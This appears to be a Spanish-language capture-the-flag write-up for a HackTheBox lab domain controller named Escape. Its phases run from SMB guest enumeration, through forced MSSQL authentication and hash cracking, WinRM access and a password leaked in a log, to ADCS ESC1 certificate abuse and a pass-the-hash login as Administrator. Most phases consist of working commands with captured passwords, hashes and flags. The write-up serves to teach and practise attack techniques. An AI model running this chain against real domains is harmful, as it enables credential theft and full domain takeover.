00 — Overview

Resumen Ejecutivo

Escape es un DC Windows Server 2019 que encadena exposición de información en SMB, captura de credenciales MSSQL y una misconfiguration crítica de ADCS (ESC1). Punto de entrada por guest, escalada final a Domain Admin mediante un certificado malicioso.

Attack Path
SMB guest → PDF con creds MSSQL → xp_dirtree NTLMv2 sql_svc → hashcat → WinRM → ERRORLOG.BAK → Ryan.Cooper → certipy-ad ESC1 → Administrator hash → Domain Admin
01 — Recon

Nmap — DC con MSSQL 1433 y WinRM 5985

Fase 01
Domain Controller confirmado — MSSQL + WinRM abren la superficie

Perfil de puertos clásico de DC: 53, 88, 389, 445, 636, 3268. Destacan MSSQL en 1433 (vector de captura NTLMv2) y WinRM en 5985 (acceso post-credenciales). El banner NTLM del servicio MSSQL filtra el dominio.

# Banner NTLM via nmap script ms-sql-ntlm-info
DNS_Domain_Name: sequel.htb
Product_Version: 10.0.17763 # Windows Server 2019
02 — SMB

SMB guest — PDF con credenciales en share público

Fase 02
Share Public accesible con guest → SQL Server Procedures.pdf

El share Public no requiere credenciales válidas. Contiene un PDF de onboarding que incluye credenciales de acceso MSSQL para usuarios nuevos: PublicUser / GuestUserCantWrite1. También se enumeran usuarios del dominio via RID brute-force.

nxc smb 10.129.17.228 -u guest -p '' --shares
Public   READ

smbclient //10.129.17.228/Public -U guest -N -c 'mget *'
# PDF revela: PublicUser / GuestUserCantWrite1

nxc smb 10.129.17.228 -u guest -p '' --rid-brute 3000 | grep SidTypeUser
sql_svc / Ryan.Cooper / Tom.Henn / Brandon.Brown / James.Roberts
03 — MSSQL

MSSQL — Forced auth via xp_dirtree → NTLMv2 de sql_svc

Fase 03
PublicUser en MSSQL → captura NTLMv2 → hashcat → REGGIE1234ronnie

Autenticados en MSSQL como PublicUser, forzamos una conexión SMB de vuelta hacia nuestra máquina usando xp_dirtree o el módulo de nxc. El servidor MSSQL intenta autenticarse con la cuenta de servicio sql_svc, entregando su hash NTLMv2. Hascat con -m 5600 lo crackea rápidamente.

nxc mssql 10.129.17.228 -u PublicUser -p GuestUserCantWrite1 --local-auth
[+] DC\PublicUser:GuestUserCantWrite1

# Forced auth → NTLMv2 capturado
SQL_SVC::sequel:...: [hash NTLMv2]

hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
SQL_SVC::sequel:...: REGGIE1234ronnie
04 — WinRM

Shell como sql_svc vía WinRM

Fase 04
sql_svc:REGGIE1234ronnie → evil-winrm → shell inicial

La contraseña crackeada da acceso WinRM. Desde la shell enumeramos directorios de SQL Server en busca de logs y configuraciones.

nxc winrm 10.129.17.228 -u sql_svc -p REGGIE1234ronnie
[+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)

evil-winrm -i 10.129.17.228 -u sql_svc -p REGGIE1234ronnie
05 — Lateral Movement

ERRORLOG.BAK — Contraseña de Ryan.Cooper en texto claro

Fase 05
Log de SQL Server filtra credenciales en campo de usuario erróneo

En C:\SQLServer\Logs\ERRORLOG.BAK hay un login fallido donde el usuario escribió su contraseña en el campo username. Un patrón muy frecuente en auditorías reales: los logs de aplicación quedan como fuente de credenciales inadvertidas.

*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK

Logon failed for user 'sequel.htb\Ryan.Cooper'
Logon failed for user 'NuclearMosquito3' # contraseña tipada como username

evil-winrm -i 10.129.17.228 -u Ryan.Cooper -p NuclearMosquito3
user.txt: 33d63cd3ab0adbe33b7182974d3b2be8
06 — PrivEsc

ESC1 ADCS — Certificado malicioso → hash Administrator

Fase 06
certipy-ad detecta ESC1 en UserAuthentication → impersonar Administrator

El template UserAuthentication tiene EnrolleeSuppliesSubject activo y permite autenticación de cliente. Cualquier usuario del dominio puede pedir un certificado con el UPN de administrator. Con ese certificado, Certipy recupera el hash NTLM del Administrator mediante autenticación PKINIT.

certipy-ad find -dc-ip 10.129.17.228 -u Ryan.Cooper -p NuclearMosquito3 -vulnerable -stdout
[!] ESC1: UserAuthentication — EnrolleeSuppliesSubject + Client Auth

certipy-ad req -dc-ip 10.129.17.228 -u Ryan.Cooper -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
[+] Wrote certificate to administrator.pfx

certipy-ad auth -pfx administrator.pfx -username administrator -domain sequel.htb -dc-ip 10.129.17.228
NT hash: a52f78e4c751e5f5e17e1e9f3e58f4ee

evil-winrm -i 10.129.17.228 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
root.txt: 68dda7ddebe4f3da4521d397d8117cf8
